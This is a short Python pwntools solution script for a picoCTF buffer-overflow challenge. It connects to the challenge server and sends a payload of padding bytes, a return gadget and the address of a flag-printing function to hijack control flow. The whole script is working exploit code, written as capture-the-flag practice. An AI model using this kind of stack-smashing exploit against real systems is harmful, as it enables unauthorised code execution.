# Solution

from pwn import *

HOST = 'saturn.picoctf.net'
PORT = 49370

def main():
  context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

  proc = remote(HOST, PORT)
  #proc = process('./vuln')
  #gdb.attach(proc)
  #sleep(5)

  buff = b'A' * 0x40
  ebp = b'A' * 8

  g_ret = p64(0x4012b1)
  f_flag = p64(0x401236)

  payload = b''.join([
    buff,
    ebp,
    g_ret,
    f_flag
  ])

  proc.sendlineafter(b'Give me a string that gets you the flag: ', payload)
  print(proc.recv())
  print(proc.recv())


if __name__ == '__main__':
  main()
